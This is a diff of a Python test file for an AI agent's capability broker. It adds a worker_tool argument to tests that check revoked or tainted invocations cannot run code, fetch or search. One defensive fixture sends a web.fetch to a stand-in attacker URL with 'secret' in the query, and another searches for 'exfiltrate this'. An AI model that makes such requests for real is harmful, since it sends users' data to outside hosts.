@@ -67,8 +67,10 @@ def caller(runtime):
     return runtime.store.create_user(email=f"{_unique('late')}@t.local")
 
 
-def _broker(engine, **kwargs):
-    return CapabilityBroker(engine, InvocationContext(**kwargs))
+def _broker(engine, *, worker_tool="agent.files_v1", **kwargs):
+    return CapabilityBroker(
+        engine, InvocationContext(**kwargs), worker_tool=worker_tool
+    )
 
 
 def _ask(broker, invocation, capability, payload, seq=1):
@@ -245,7 +247,7 @@ class TestARevokedInvocationLaunchesNoSandboxChild:
         invocation.revoke("cancelled")
         try:
             reply = _ask(
-                _broker(engine, user_id=caller.id),
+                _broker(engine, worker_tool="code.python_v1", user_id=caller.id),
                 invocation,
                 "python.run",
                 {"code": "print('should not run')"},
@@ -281,7 +283,7 @@ class TestARevokedInvocationLaunchesNoSandboxChild:
         )
         try:
             reply = _ask(
-                _broker(engine, user_id=caller.id),
+                _broker(engine, worker_tool="code.python_v1", user_id=caller.id),
                 invocation,
                 "python.run",
                 {"code": "print(1)"},
@@ -624,7 +626,7 @@ class TestWithdrawalIsEnforcedAtTheCapability:
         invocation = self._tainted()
         try:
             reply = _ask(
-                _broker(engine, user_id=caller.id),
+                _broker(engine, worker_tool="web.fetch_v1", user_id=caller.id),
                 invocation,
                 "web.fetch",
                 {"url": "http://attacker.invalid/?q=secret"},
@@ -645,7 +647,7 @@ class TestWithdrawalIsEnforcedAtTheCapability:
         invocation = self._tainted("web.search_v1")
         try:
             reply = _ask(
-                _broker(engine, user_id=caller.id),
+                _broker(engine, worker_tool="web.search_v1", user_id=caller.id),
                 invocation,
                 "web.search",
                 {"query": "exfiltrate this"},
@@ -667,7 +669,7 @@ class TestWithdrawalIsEnforcedAtTheCapability:
         invocation = self._tainted("code.python_v1")
         try:
             reply = _ask(
-                _broker(engine, user_id=caller.id),
+                _broker(engine, worker_tool="code.python_v1", user_id=caller.id),
                 invocation,
                 "python.run",
                 {"code": "print(1)"},
